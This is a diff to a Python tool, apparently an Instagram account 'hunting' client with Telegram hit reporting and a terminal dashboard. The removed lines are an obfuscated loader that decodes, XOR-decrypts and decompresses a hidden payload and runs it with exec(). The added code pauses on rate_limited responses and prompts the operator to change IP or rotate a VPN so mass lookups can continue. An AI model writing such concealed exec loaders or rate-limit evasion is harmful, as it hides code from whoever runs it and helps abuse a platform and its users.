1428, 2406, 2310, 2972, 949, 51, 1281, 3042, 3038, 1192, 2713, 1407, 1279, 1860, 210, 2919, 3612, 2978, 3141, 1715, 1158, 665, 2697, 3209, 3013, 1673, 3688, 170, 3531, 3099, 1373, 2254, 330, 3571, 1243, 1533, 2393, 2996, 1249, 2868, 1385, 1166, 1594, 3150, 1327, 2648, 2317, 1306, 2334, 2365, 2234, 2554, 2822, 3069, 414, 589, 1742, 653, 1304, 1294, 2084, 2740, 1403, 1872, 2387, 2213, 3493, 487, 263, 724, 3322, 852, 670, 1439, 1900, 3427, 3132, 3140, 2727, 1647, 1997, 245, 2911, 3214, 1721, 2564, 450, 659, 2459, 630, 1138, 3056, 1907, 3371, 201, 712, 2432, 1392, 2854, 838, 1144, 2528, 1646, 1543, 2612, 853, 75, 537, 1662, 1212, 2262, 729, 2497, 528, 37, 2853, 3392, 1276, 2912, 1405, 3083, 2494, 1561, 3673, 1430, 2294, 2914, 1838, 591, 3002, 1950, 1937, 162, 3065, 2582, 1104, 597, 283, 3281, 2081, 1892, 2758, 3131, 1823, 3400, 875, 1813, 529, 375, 196, 342, 1784, 1964, 3526, 2057, 65, 3180, 3225, 2641, 2789, 2404, 480, 1482, 2114, 2037, 2169, 177, 1297, 48, 3455, 2329, 3112, 2129, 844, 2260, 469, 354, 1274, 206, 3412, 1318, 3436, 818, 1634, 2962, 2312, 2082, 3655, 1526, 2510, 902, 3502, 2252, 3511, 1961, 346, 463, 1668, 449, 1013, 2412, 2886, 1432, 462, 886, 3296, 2178, 1613, 951, 1874, 2104, 1488, 289, 2825, 3283, 1082, 3376, 3433, 445, 2138, 371, 1012, 2579, 2788, 2119, 2832, 876, 1922, 1535, 756, 3689, 3062, 2901, 3174, 1957, 2467, 3152, 2971, 3449, 125, 1114, 551, 1621, 302, 1746, 2411, 287, 2544, 3354, 3646, 2839, 322, 2086, 549, 2202, 1903, 29, 1736, 2009, 105, 340, 3497, 3623, 600, 2699, 2421, 1091, 440, 3674, 1675, 693, 2611, 1796, 3182, 1393, 3179, 1460, 2746, 917, 2835, 3278, 2014, 2735, 839, 3204, 2033, 2894, 2741, 1178, 2989, 1713, 1447, 1938, 2108, 2943, 1458, 3366, 2335, 2067, 2711, 1751, 355, 2688, 1781, 2402, 3607, 1631, 2259, 3645, 3592, 1366, 2791, 397, 1639, 2096, 147, 3012, 2652, 3470, 86, 2201, 690, 811, 1309, 3293, 2216, 1679, 1924, 713, 3151, 1369, 2567, 226, 3032, 2322, 1055, 3101, 2640, 822, 317, 3416, 646, 2291, 1059, 624, 572, 1759, 2120, 1778, 3250, 403, 498, 2076, 2702, 1708, 2051, 1583, 2936, 1023, 1883, 669, 3634, 3314, 889, 122, 290, 3116, 2591, 2985, 2811, 1792, 3622, 3424, 1636, 468, 2607, 1038, 2258, 3257, 3189, 912, 3045, 2003, 1525, 3557, 658, 3605, 3218, 603, 3403, 2239, 2598, 773, 2290, 2662, 199, 3462, 3423, 744, 627, 1452, 3052, 965, 1410, 2292, 219, 2842, 192, 640, 1383, 522, 2654, 3184, 1814, 3510, 3106, 2959, 2606, 264, 3574, 2710, 2095, 1571, 1130, 2172, 3111, 1962, 2941, 2072, 2977, 2829, 2070, 3386, 2883, 1331, 628, 1050, 1417, 772, 2140, 2668, 2574, 1919, 384, 2327, 3375, 981, 1367, 4, 770, 2155, 3165, 2449, 1453, 78, 1894, 3567, 1041, 1604, 993, 3604, 2124, 277, 1299, 1884, 3341, 1003, 470, 1501, 3034, 1989, 3549, 1958, 3694, 2549, 920, 2570, 2093, 774, 2979, 2589, 2523, 1556, 527, 1945, 114, 3617, 1752, 2293, 242, 2675, 1664, 3331, 3309, 2195, 344, 2444, 1378, 19, 257, 1869, 861, 2148, 2455, 1676, 3602, 1835, 3378, 117, 1857, 1181, 1437, 1363, 2454, 3263, 3583, 720, 2482, 137, 1141, 1511, 457, 3495, 1346, 3537, 481, 2007, 2013, 1768, 2876, 3405, 2378, 3246, 1754, 1698, 2571, 321, 1908, 2121, 2130, 740, 499, 2303, 2184, 1235, 575, 1665, 3235, 3527, 1655, 1195, 1066, 1764, 2315, 2888, 3242, 1079, 3595, 1603, 2915, 2884, 2105, 2226, 1834, 893, 2902, 1697, 101, 2581, 1245, 1921, 717, 44, 3444, 2847, 775, 2181, 3104, 3459, 2535, 1524, 1017, 2158, 405, 2376, 3505, 1339, 2851, 2401, 901, 202, 3414, 1564, 61, 3260, 129, 1868, 1591, 2602, 806, 3650, 2106, 1051, 2976, 2219, 2197, 2325, 2722, 2190, 878, 3315, 1033, 141, 1936, 1198, 3585, 554, 52, 960, 2118, 1853, 2273, 989, 3194, 3168, 1899, 1019, 1653, 1062, 2616, 2186, 2352, 422, 1718, 1338, 2957, 1666, 482, 3060, 837, 448, 2701, 2802, 1078, 1223, 941, 1422, 85, 345, 1630, 1756, 2632, 2705, 971, 1360, 1779, 3624, 850, 1470, 115, 1966, 1810, 1473, 93, 3312, 3295, 28, 2667, 2649, 1118, 2858, 2395, 2156, 1694, 636, 2733, 1307, 2530, 765, 2913, 2396, 1839, 1690, 809, 389, 1905, 2583, 2024, 1812, 143, 683, 748, 134, 2133, 3128, 1802, 840, 881, 71, 1467, 2117, 2734, 1098, 1745, 1213, 3474, 1824, 298, 2318, 715, 3216, 1054, 2650, 451, 1398, 3411, 3374, 2211, 2163, 49, 2752, 813, 3022, 2695, 2062, 3358, 1113, 148, 1129, 1622, 2413, 2280, 1793, 489, 2399, 3020, 2747, 970, 2803, 1361, 521, 2899, 2125, 3068, 947, 59, 461, 3228, 3172, 2257, 3627, 1932, 1210, 505, 987, 867, 2340, 918, 240, 2623, 1220, 231, 2054, 3458, 2032, 3687, 1584, 1777, 1233, 1097, 863, 2487, 2946, 3463, 990, 1477, 3409, 3578, 795, 2005, 2464, 3609, 767, 1889, 3212, 1942, 3244, 1925, 2515, 2815, 1843, 2142, 2805, 730, 1953, 77, 789, 3390, 1722, 3061, 2823, 2382, 3501, 2993, 2514, 3073, 1527, 2409, 2066, 607, 1121, 2597, 508, 2030, 2065, 367, 3672, 387, 3394, 1856, 1347, 1060, 159, 2509, 1057, 1672, 380, 1577, 1260, 181, 2643, 3562, 3072, 1640, 1442, 1558, 1612, 927, 1623, 3418, 1566, 581, 2391, 2810, 3535, 1844, 407, 1850, 2321, 921, 2008, 3084, 678, 1103, 1917, 734, 2633, 2165, 2630, 2092, 3340, 3161, 910, 3512, 511, 1165, 2953, 1774, 1176, 2486, 3171, 338, 1923, 2533, 1397, 3030, 2212, 3486, 3491, 327, 1376, 520, 2390, 647, 1504, 3252, 299, 2731, 3561, 2999, 1329, 3487, 1786, 1444, 138, 3679, 1218, 2804, 1589, 706, 583, 732, 515, 484, 1579, 830, 2479, 2719, 792, 1150, 1090, 2517, 236, 2896, 3195, 1303, 2056, 868, 3582, 2820, 829, 909, 2895, 641, 1508, 3684, 1031, 3265, 3629, 842, 3301, 1657, 1547, 2520, 3330, 1642, 778, 2492, 1151, 395, 667, 2981, 509, 3429, 3570, 2137, 3566, 3254, 3488, 249, 151, 3024, 2247, 2143, 3380, 1593, 2089, 3249, 1493, 3670, 320, 2743, 3339, 1224, 2689, 2875, 606, 1954, 3147, 1310, 576, 1221, 3237, 1450, 1364, 3599, 22, 2039, 2372, 884, 2283, 166, 1496, 684, 566, 2041, 1350, 2813, 1851, 3338, 1371, 1880, 423, 2102, 3407, 295, 855, 3190, 1970, 559, 2196, 2264, 2852, 1555, 3162, 2123, 2187, 472, 702, 1416, 1934, 1841, 2969, 1776, 1495, 3347, 2173, 1706, 3277, 144, 1242, 1271, 2478, 587, 2194, 2966, 2171, 2289, 530, 1073, 1727, 984, 1040, 2887, 2534, 60, 2369, 3253, 3666, 3532, 1507, 3345, 1663, 1146, 728, 2759, 1411, 1544, 2136, 2639, 945, 3008, 3540, 723, 3385, 897, 62, 578, 2618, 3611, 1402, 2929, 2848, 1951, 1519, 454, 1771, 3628, 224, 1305, 1864, 1010, 1029, 3369, 503, 1451, 500, 2022, 594, 1489, 2831, 1247, 2771, 2634, 2964, 492, 1981, 1849, 758, 2152, 3333, 688, 650, 2189, 3608, 1236, 1536, 686, 2508, 3241, 1270, 561, 431, 1532, 1267, 2814, 956, 1918, 3274, 1002, 3575, 2431, 504, 3243, 1770, 2385, 3649, 1926, 3642, 3410, 464, 2924, 3697, 923, 2763, 3320, 3700, 223, 1293, 709, 442, 3417, 1238, 119, 1395, 3075, 3267, 3155, 2167, 673, 1572, 2942, 2429, 1487, 1105, 252, 3460, 1506, 3206, 2042, 3350, 1710)
-_b61ffe10ff = '1301458103b090899ddf994a04ae190f3f4169b50adfafe639a6cf358f2acb3b'
-def _b9cb8f501d():
-    import base64 as _b85
-    import hashlib as _hl
-    import lzma as _lz
-    _key = _hl.sha256(_65a22ae481 + b''.join(_8bd4918204)).digest()
-    _ordered = [_74434bc333[_7f2d14173c[i]] for i in range(len(_7f2d14173c))]
-    _raw = "".join(_ordered)
-    _blob = _b85.b85decode(_raw.encode('ascii'))
-    _xored = bytes(_blob[i] ^ _key[i % len(_key)] for i in range(len(_blob)))
-    _plain = _lz.decompress(_xored)
-    _inner = _plain.decode('utf-8')
-    if _hl.sha256(_inner.encode()).hexdigest() != _b61ffe10ff:
-        щФКИрКІЫЏУжйльЄг()
-    _g = globals()
-    _bi = __builtins__ if isinstance(__builtins__, dict) else __builtins__.__dict__
-    (_bi.get("exec") or __import__("builtins").exec)(_inner, _g)
-_b9cb8f501d()
+adapter = HTTPAdapter(max_retries=retry_strategy)
+session.mount("http://", adapter)
+session.mount("https://", adapter)
+
+# Gateway calls: no urllib retries (fail fast when endpoint.py is down)
+api_session = requests.Session()
+api_session.headers.update({"Connection": "keep-alive"})
+def _hunt_gateway_slots_for_threads(count):
+    """Cap parallel gateway calls — endpoint.py must allow matching hunt_cycle slots."""
+    count = max(1, int(count))
+    if _IS_TERMUX:
+        cap = globals().get("TERMUX_HUNT_GATEWAY_MAX", 64)
+        return min(count, cap)
+    cap = globals().get("DESKTOP_HUNT_GATEWAY_MAX", 48)
+    return min(count, cap)
+
+
+def _resize_hunt_gateway_sem(slots):
+    """Sync semaphore when /set threads changes — old sem left too few slots (Termux 50/min bug)."""
+    global _hunt_gateway_sem, HUNT_GATEWAY_CONCURRENCY
+    slots = max(1, int(slots))
+    HUNT_GATEWAY_CONCURRENCY = slots
+    _hunt_gateway_sem = threading.Semaphore(slots)
+
+
+def _hunt_http_pool_size():
+    return max(_hunt_gateway_slots_for_threads(THREAD_COUNT) + 12, THREAD_COUNT + 8)
+
+
+_hunt_http_pool = _hunt_http_pool_size()
+_api_pool_adapter = HTTPAdapter(
+    pool_connections=_hunt_http_pool,
+    pool_maxsize=_hunt_http_pool,
+    max_retries=Retry(total=0),
+    pool_block=False,
+)
+api_session.mount("http://", _api_pool_adapter)
+api_session.mount("https://", _api_pool_adapter)
+
+_api_probe_session = requests.Session()
+_api_probe_adapter = HTTPAdapter(
+    pool_connections=2,
+    pool_maxsize=2,
+    max_retries=Retry(total=0),
+    pool_block=False,
+)
+_api_probe_session.mount("http://", _api_probe_adapter)
+_api_probe_session.mount("https://", _api_probe_adapter)
+
+_hunt_gateway_sem = threading.Semaphore(HUNT_GATEWAY_CONCURRENCY)
+_hit_report_workers = 12 if _IS_TERMUX else 10
+_hit_report_executor = ThreadPoolExecutor(
+    max_workers=_hit_report_workers,
+    thread_name_prefix="hitreport",
+)
+_hit_gateway_sem = threading.Semaphore(2 if _IS_TERMUX else 4)
+_hit_endpoint_enrich_sem = threading.Semaphore(1 if _IS_TERMUX else 2)
+_hit_bg_enrich_sem = threading.Semaphore(10 if _IS_TERMUX else 12)
+_hit_during_hunt_sem = threading.Semaphore(1 if _IS_TERMUX else 2)
+_hit_hunt_contact_sem = threading.Semaphore(1)
+_hit_enrich_workers = 4
+_hit_enrich_executor = ThreadPoolExecutor(
+    max_workers=_hit_enrich_workers,
+    thread_name_prefix="hitenrich",
+)
+_hit_upgrade_workers = 4 if _IS_TERMUX else 6
+_hit_upgrade_executor = ThreadPoolExecutor(
+    max_workers=_hit_upgrade_workers,
+    thread_name_prefix="hitupgrade",
+)
+_hit_deep_idle_queue = []
+_hit_deep_idle_lock = threading.Lock()
+_hit_tg_delivery_executor = ThreadPoolExecutor(
+    max_workers=3 if _IS_TERMUX else 4,
+    thread_name_prefix="hittg",
+)
+
+_hit_api_session = requests.Session()
+_hit_api_session.headers.update({"Connection": "keep-alive"})
+_hit_api_adapter = HTTPAdapter(
+    pool_connections=4,
+    pool_maxsize=4,
+    max_retries=Retry(total=0),
+    pool_block=False,
+)
+_hit_api_session.mount("http://", _hit_api_adapter)
+_hit_api_session.mount("https://", _hit_api_adapter)
+
+_hunt_blip_lock = threading.Lock()
+_hunt_blip_until = 0.0
+_hunt_blip_fail_times = []
+_hunt_blip_last_log = 0.0
+_hunt_ig_rate_streak = 0
+_hunt_ip_change_pause_until = 0.0
+_hunt_ip_change_pause_lock = threading.Lock()
+_hunt_ip_change_last_log = 0.0
+
+
+def _hunt_ig_gen_timeout():
+    """Buffered /ig_gen is usually instant; short read avoids slot hogging."""
+    return (HUNT_CONNECT_TIMEOUT, HUNT_IG_GEN_READ_TIMEOUT)
+
+
+def _hunt_lookup_timeout():
+    return (HUNT_CONNECT_TIMEOUT, HUNT_LOOKUP_READ_TIMEOUT)
+
+
+def _hunt_request_timeout():
+    return (HUNT_CONNECT_TIMEOUT, TIMEOUT)
+
+
+def _hunt_cycle_request_timeout():
+    """Must outlive endpoint lookup budget (38s) — never clip or valid=0 floods."""
+    read = HUNT_CYCLE_TIMEOUT
+    if not _IS_TERMUX:
+        read = max(read, 42)
+    return (HUNT_CONNECT_TIMEOUT, read)
+
+
+def _hunt_worker_backoff_before_cycle():
+    """Stagger workers when buffer low or IG lookup cooldown — never use pause_event as sleep."""
+    meta = _hunt_gateway_meta
+    buf = meta.get("buffer")
+    ig_block = float(meta.get("ig_block") or 0)
+    rl_streak = int(_hunt_ig_rate_streak)
+    if rl_streak >= 20:
+        time.sleep(min(1.2 + rl_streak * 0.015, 3.5) + random.uniform(0.05, 0.2))
+        return
+    if rl_streak >= 8:
+        time.sleep(0.25 + rl_streak * 0.02 + random.uniform(0.02, 0.12))
+        return
+    if ig_block > 1.0:
+        time.sleep(min(ig_block * 0.5, 2.0) + random.uniform(0.05, 0.25))
+        return
+    if isinstance(buf, int):
+        if buf <= 0:
+            time.sleep(0.35 + random.uniform(0.0, 0.55))
+        elif buf < 50:
+            time.sleep(0.12 + random.uniform(0.0, 0.2))
+        elif buf < HUNT_KEEPALIVE_BUFFER_MIN:
+            time.sleep(0.04 + random.uniform(0.0, 0.08))
+        # Buffer stocked — drain fast; do not throttle when backlog is high.
+    with _hunt_inflight_lock:
+        inflight = int(_hunt_inflight)
+    drain_lookup = (
+        _IS_TERMUX
+        and isinstance(buf, int)
+        and buf >= TERMUX_BUFFER_NEAR_FULL
+    )
+    if not drain_lookup and _IS_TERMUX and inflight >= HUNT_GATEWAY_CONCURRENCY:
+        time.sleep(0.04 + random.uniform(0.02, 0.12))
+
+
+def _api_hunt_get(url, timeout, *, hold_slot=False):
+    """Gateway GET; hold_slot=True when caller already owns _hunt_gateway_sem."""
+    if hold_slot:
+        return api_session.get(url, timeout=timeout)
+    with _hunt_gateway_sem:
+        return api_session.get(url, timeout=timeout)
+
+
+def _api_hunt_get_retry(url, timeout, *, hold_slot=False, attempts=2):
+    last_exc = None
+    for attempt in range(attempts):
+        try:
+            return _api_hunt_get(url, timeout, hold_slot=hold_slot)
+        except requests.exceptions.ConnectionError as exc:
+            last_exc = exc
+            msg = str(exc).lower()
+            if attempt + 1 < attempts and (
+                "pool" in msg or "connection" in msg
+            ):
+                time.sleep(0.06 * (attempt + 1))
+                continue
+            raise
+    if last_exc:
+        raise last_exc
+    raise requests.exceptions.ConnectionError("gateway connection failed")
+
+
+def _hunt_transient_error(exc):
+    if isinstance(
+        exc,
+        (
+            requests.exceptions.Timeout,
+            requests.exceptions.ConnectionError,
+            requests.exceptions.ChunkedEncodingError,
+        ),
+    ):
+        return True
+    msg = str(exc).lower()
+    return any(
+        token in msg
+        for token in (
+            "timed out",
+            "timeout",
+            "connection refused",
+            "connection reset",
+            "connection aborted",
+            "network is unreachable",
+            "temporary failure",
+            "max retries exceeded",
+            "failed to establish",
+            "connection pool",
+            "too many open files",
+        )
+    )
+
+
+def _hunt_in_network_blip():
+    return time.time() < _hunt_blip_until
+
+
+def _is_hunt_ig_rate_limited(ig_msg):
+    msg = (ig_msg or "").strip().lower()
+    return msg == "rate_limited"
+
+
+def _hunt_in_ip_change_pause():
+    return time.time() < _hunt_ip_change_pause_until
+
+
+def _hunt_ip_change_pause_left():
+    return max(0.0, _hunt_ip_change_pause_until - time.time())
+
+
+def _clear_hunt_ip_change_pause():
+    """After VPN rotate or /resume — drop IG rate-limit cooldown."""
+    global _hunt_ip_change_pause_until, _hunt_ig_rate_streak
+    with _hunt_ip_change_pause_lock:
+        _hunt_ip_change_pause_until = 0.0
+        _hunt_ig_rate_streak = 0
+
+
+def _trigger_hunt_ip_change_pause():
+    global _hunt_ip_change_pause_until, _hunt_ig_rate_streak, _hunt_ip_change_last_log
+    now = time.time()
+    with _hunt_ip_change_pause_lock:
+        _hunt_ip_change_pause_until = now + HUNT_IG_RATE_LIMIT_PAUSE_SEC
+        _hunt_ig_rate_streak = 0
+        if now - _hunt_ip_change_last_log < 30:
+            return
+        _hunt_ip_change_last_log = now
+    secs = int(HUNT_IG_RATE_LIMIT_PAUSE_SEC)
+    pause_lbl = f"{secs}s" if secs < 60 else f"{secs // 60}min"
+    log_event(
+        "IG RATE",
+        f"{HUNT_IG_RATE_LIMIT_STREAK_TRIGGER}× rate_limited — hunt paused {pause_lbl} · CHANGE IP",
+    )
+
+
+def _note_hunt_ig_lookup_result(ig_msg):
+    """Track consecutive IG rate_limited — pause hunt 2min and show CHANGE IP on panel."""
+    global _hunt_ig_rate_streak
+    if _hunt_in_ip_change_pause():
+        return
+    if _is_hunt_ig_rate_limited(ig_msg):
+        _hunt_ig_rate_streak += 1
+        if _hunt_ig_rate_streak >= HUNT_IG_RATE_LIMIT_STREAK_TRIGGER:
+            _trigger_hunt_ip_change_pause()
+    else:
+        _hunt_ig_rate_streak = 0
+
+
+def _hunt_recently_ok():
+    """Recent successful hunt_cycle — gateway is up even if VPN blip failed a probe."""
+    if _hunt_in_network_blip():
+        return True
+    return (time.time() - _api_last_hunt_ok_at) < API_HUNT_ALIVE_GRACE_SEC
+
+
+def _endpoint_hard_down_error(exc):
+    """Only endpoint.py not running — not VPN timeouts on localhost hunt_cycle."""
+    if isinstance(exc, requests.exceptions.ConnectionError):
+        msg = str(exc).lower()
+        return (
+            "connection refused" in msg
+            or "failed to establish a new connection" in msg
+        )
+    return False
+
+
+def _mark_api_alive_from_hunt_success():
+    global _api_probe_fail_streak, _api_auto_paused, _api_last_hunt_ok_at, _hunt_blip_until
+    _api_last_hunt_ok_at = time.time()
+    _hunt_blip_until = 0.0
+    _api_probe_fail_streak = 0
+    with _health_lock:
+        _health_cache["api"] = True
+        _health_cache["api_base"] = f"http://{ip}:{port}"
+        _health_cache["api_via"] = "local" if ip in ("127.0.0.1", "localhost") else "public"
+        _health_cache["api_at"] = time.time()
+    if _api_auto_paused:
+        _api_auto_paused = False
+        _log_api_pause_change("API online — hunt recovered")
+        apply_worker_pause_state()
+
+
+def _log_api_pause_change(message):
+    global _api_pause_log_at
+    now = time.time()
+    if now - _api_pause_log_at < 20:
+        return
+    _api_pause_log_at = now
+    log_event("CONFIG", message)
+
+
+def _mark_api_dead_from_hunt(exc):
+    """VPN/IP rotate causes hunt timeouts — never instant-pause from those."""
+    global _api_probe_fail_streak
+    if _hunt_recently_ok():
+        return
+    if not _endpoint_hard_down_error(exc):
+        return
+    msg = str(exc).lower()
+    if not any(token in msg for token in ("127.0.0.1", "localhost", f":{port}")):
+        return
+    _api_probe_fail_streak += 1
+    if _api_probe_fail_streak < API_PROBE_FAIL_THRESHOLD:
+        return
+    global _api_auto_paused
+    with _health_lock:
+        _health_cache["api"] = False
+        _health_cache["api_base"] = None
+        _health_cache["api_via"] = None
+        _health_cache["api_at"] = time.time()
+    if not _api_auto_paused:
+        _api_auto_paused = True
+        _log_api_pause_change("Auto-paused — endpoint.py not running")
+    apply_worker_pause_state()
+
+
+def _hunt_register_transient_fail():
+    global _hunt_blip_until, _hunt_blip_last_log
+    now = time.time()
+    with _hunt_blip_lock:
+        _hunt_blip_fail_times.append(now)
+        cutoff = now - HUNT_BLIP_WINDOW_SEC
+        _hunt_blip_fail_times[:] = [t for t in _hunt_blip_fail_times if t >= cutoff]
+        if len(_hunt_blip_fail_times) < HUNT_BLIP_TRIGGER:
+            return
+        _hunt_blip_until = max(_hunt_blip_until, now + HUNT_BLIP_PAUSE_SEC)
+        if now - _hunt_blip_last_log < 20:
+            return
+        _hunt_blip_last_log = now
+    log_event("NET BLIP", f"link pause {HUNT_BLIP_PAUSE_SEC:.0f}s (VPN/IP rotate?)")
+
+
+def apply_color(text, color):
+    return f"{color}{text}{ANSI_RESET}" if COLOR_SUPPORT else text
+
+
+def rgb(r, g, b):
+    return f"\033[38;2;{r};{g};{b}m"
+
+
+def gradient_line(text, start, end):
+    if not COLOR_SUPPORT or not text:
+        return text
+    r1, g1, b1 = start
+    r2, g2, b2 = end
+    out = []
+    width = max(len(text) - 1, 1)
+    for i, ch in enumerate(text):
+        t = i / width
+        r = int(r1 + (r2 - r1) * t)
+        g = int(g1 + (g2 - g1) * t)
+        b = int(b1 + (b2 - b1) * t)
+        out.append(f"{rgb(r, g, b)}{ch}")
+    return "".join(out) + ANSI_RESET
+
+
+BANNER_LOGO = [
+    "     ██╗███╗   ██╗██████╗  █████╗ ██████╗ ███████╗████████╗ ██████╗ ",
+    "     ██║████╗  ██║██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔═══██╗",
+    "     ██║██╔██╗ ██║██████╔╝███████║██████╔╝█████╗     ██║   ██║   ██║",
+    "     ██║██║╚██╗██║██╔═══╝ ██╔══██║██╔══██╗██╔══╝     ██║   ██║   ██║",
+    "     ██║██║ ╚████║██║     ██║  ██║██║  ██║███████╗   ██║   ╚██████╔╝",
+    "     ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝ ",
+]
+
+JOINT_BADGE = [
+    "        ╭──────────────────────────────────────────────╮",
+    
+    "        │  ◆  Developed & Maintained by S Crew  ◆      │",
+    "        ╰──────────────────────────────────────────────╯",
+]
+
+LOGO_PALETTE = [
+    ((0, 255, 255), (0, 140, 255)),
+    ((0, 220, 255), (80, 90, 255)),
+    ((100, 180, 255), (140, 60, 255)),
+    ((160, 120, 255), (200, 40, 255)),
+    ((200, 80, 255), (255, 60, 200)),
+    ((255, 40, 180), (255, 80, 120)),
+]
+
+
+def paint_logo_lines(badge_lines):
+    lines = []
+    for idx, row in enumerate(BANNER_LOGO):
+        start, end = LOGO_PALETTE[idx]
+        lines.append("  " + gradient_line(row, start, end))
+    for row in badge_lines:
+        lines.append(apply_color(row, ANSI_MAGENTA))
+    return lines
+
+
+def visible_len(text):
+    return len(re.sub(r"\033\[[0-9;]*m", "", text))
+
+
+def pad_value(value, width):
+    pad = max(width - visible_len(value), 0)
+    return f"{value}{' ' * pad}"
+
+
+def line_pad_visible(line, width):
+    return line + (" " * max(width - visible_len(line), 0))
+
+
+def _card_inner_w(label_w, value_w):
+    return label_w + value_w + 3
+
+
+def _fit_label(label, label_w):
+    label = str(label)
+    if len(label) <= label_w:
+        return label
+    return label[: max(label_w - 1, 1)] + "…"
+
+
+def card_blank_body(label_w, value_w):
+    left = f"  │ {' ' * label_w}│ "
+    right = f"{' ' * value_w}│"
+    return apply_color(left, ANSI_DIM) + apply_color(right, ANSI_DIM)
+
+
+def pad_card_lines(lines, target_len, label_w, value_w):
+    if len(lines) >= target_len:
+        return lines
+    top, bottom = lines[0], lines[-1]
+    body = lines[1:-1]
+    while len(body) + 2 < target_len:
+        body.append(card_blank_body(label_w, value_w))
+    return [top, *body, bottom]
+
+
+def paint_info_card(rows, label_w=11, value_w=34):
+    inner_w = _card_inner_w(label_w, value_w)
+    top = apply_color(f"  ╭{'─' * inner_w}╮", ANSI_CYAN)
+    bottom = apply_color(f"  ╰{'─' * inner_w}╯", ANSI_CYAN)
+    body = []
+    for label, value, color in rows:
+        left = f"  │ {_fit_label(label, label_w):<{label_w}}│ "
+        right = f"{pad_value(str(value), value_w)}│"
+        if color is None:
+            body.append(apply_color(left, ANSI_DIM) + right)
+        else:
+            body.append(apply_color(left, ANSI_DIM) + apply_color(right, color))
+    return [top, *body, bottom]
+
+
+ACTION_BOX_W = 73
+ACTION_INNER = 67
+
+
+def clip_plain(text, max_len):
+    plain = re.sub(r"\033\[[0-9;]*m", "", str(text))
+    if len(plain) <= max_len:
+        return plain
+    return plain[: max_len - 1] + "…"
+
+
+def paint_action_box(title, lines, border_color=ANSI_YELLOW):
+    head = f"  ┌─ {title} "
+    dashes = max(ACTION_BOX_W - len(head) - 1, 0)
+    out = [apply_color(head + "─" * dashes + "┐", border_color)]
+    for text, color in lines:
+        body = clip_plain(text, ACTION_INNER)
+        out.append(apply_color(f"  │  {body:<{ACTION_INNER}}│", color))
+    out.append(apply_color(f"  └{'─' * (ACTION_BOX_W - 4)}┘", border_color))
+    return out
+
+
+def _terminal_verify_line(label, detail, color):
+    """paint_action_box expects (text, color) pairs."""
+    return (f"{label}: {detail}", color)
+
+
+def render_keyboard_exit(*, via_menu=False):
+    clear_console()
+    print()
+    print(gradient_line("  ◆  S H U T D O W N  ◆  ", (255, 80, 90), (255, 170, 110)))
+    print()
+    stop_line = (
+        "Menu quit — process stopped (not running in background)."
+        if via_menu
+        else "Ctrl+C received — archiving session to cloud."
+    )
+    for line in paint_action_box(
+        "SESSION STOPPED",
+        [
+            (stop_line, ANSI_YELLOW),
+            ("Telegram + hunt workers stop with this process.", ANSI_DIM),
+            ("Start again:  python endpoint.py  then  python joint.py", ANSI_CYAN),
+        ],
+        ANSI_RED,
+    ):
+        print(line)
+    print(apply_color("  Safe exit complete.\n", ANSI_DIM))
+
+
+def shutdown_joint_session(*, via_menu=False):
+    """Full stop — workers/Telegram do not keep running after menu quit."""
+    global paused, _user_manual_paused, JACK_PANEL_LIVE
+    JACK_PANEL_LIVE = False
+    _panel_refresh_stop.set()
+    _panel_leave_alt_screen()
+    paused = True
+    _user_manual_paused = True
+    pause_event.clear()
+    apply_worker_pause_state(defer_access=True)
+    try:
+        profile_archive_session()
+    except Exception:
+        pass
+    render_keyboard_exit(via_menu=via_menu)
+    sys.exit(0)
+
+
+def make_colored_bar(current, total, width=20, fill_color=ANSI_GREEN):
+    if total <= 0:
+        return apply_color("─" * width, ANSI_DIM)
+    filled = min(width, int((current / total) * width))
+    if not COLOR_SUPPORT:
+        return ("▰" * filled) + ("─" * (width - filled))
+    return apply_color("▰" * filled, fill_color) + apply_color("─" * (width - filled), ANSI_DIM)
+
+
+def print_cards(cards, label_w=11, value_w=34):
+    for rows in cards:
+        for line in paint_info_card(rows, label_w, value_w):
+            print(line)
+        print()
+
+
+def _cards_side_by_side_lines(left_rows, right_rows, label_w=10, value_w=19, gap=4):
+    left_lines = paint_info_card(left_rows, label_w, value_w)
+    right_lines = paint_info_card(right_rows, label_w, value_w)
+    target_len = max(len(left_lines), len(right_lines))
+    left_lines = pad_card_lines(left_lines, target_len, label_w, value_w)
+    right_lines = pad_card_lines(right_lines, target_len, label_w, value_w)
+    col_w = max(max(visible_len(line) for line in left_lines), max(visible_len(line) for line in right_lines))
+    lines = []
+    for left, right in zip(left_lines, right_lines):
+        lines.append(line_pad_visible(left, col_w) + (" " * gap) + line_pad_visible(right, col_w))
+    lines.append("")
+    return lines
+
+
+def print_cards_side_by_side(left_rows, right_rows, label_w=10, value_w=19, gap=4):
+    for line in _cards_side_by_side_lines(left_rows, right_rows, label_w, value_w, gap):
+        print(line)
+
+
+def _local_gateway_mode():
+    return str(ip or "") in ("127.0.0.1", "localhost", "")
+
+
+def api_target_hosts():
+    hosts = []
+    p = str(port or "5001")
+    for candidate in (f"127.0.0.1:{p}", f"localhost:{p}"):
+        if candidate not in hosts:
+            hosts.append(candidate)
+    if ip and ip not in ("127.0.0.1", "localhost"):
+        remote = f"{ip}:{p}"
+        if remote not in hosts:
+            hosts.append(remote)
+    return hosts
+
+
+def get_api_base_url():
+    with _health_lock:
+        if _health_cache.get("api_base"):
+            return _health_cache["api_base"]
+    return f"http://127.0.0.1:{port}"
+
+
+def api_request_bases():
+    bases = []
+    primary = get_api_base_url()
+    if primary:
+        bases.append(primary.rstrip("/"))
+    for host in api_target_hosts():
+        base = f"http://{host}".rstrip("/")
+        if base not in bases:
+            bases.append(base)
+    return bases
+
+
+def refresh_api_probe(force=False):
+    with _health_lock:
+        age = time.time() - _health_cache.get("api_at", 0)
+        if not force and _health_cache["api"] is not None and age < PROBE_INTERVAL_OK:
+            return bool(_health_cache["api"])
+    _run_api_probe()
+    return get_api_alive()
+
+
+def api_fetch_json(path, params=None, timeout=None):
+    if not get_api_alive():
+        tried = ", ".join(api_target_hosts())
+        return None, (
+            "API offline — start endpoint.py on this PC:\n"
+            f"<code>python endpoint.py</code>\n"
+            f"<i>Probed: {html.escape(tried)}</i>"
+        )
+    query = ""
+    if params:
+        query = "&".join(f"{k}={quote(str(v))}" for k, v in params.items())
+    path = path if path.startswith("/") else f"/{path}"
+    suffix = f"{path}?{query}" if query else path
+    req_timeout = timeout or API_TOOL_TIMEOUT
+    last_err = None
+    for base in api_request_bases():
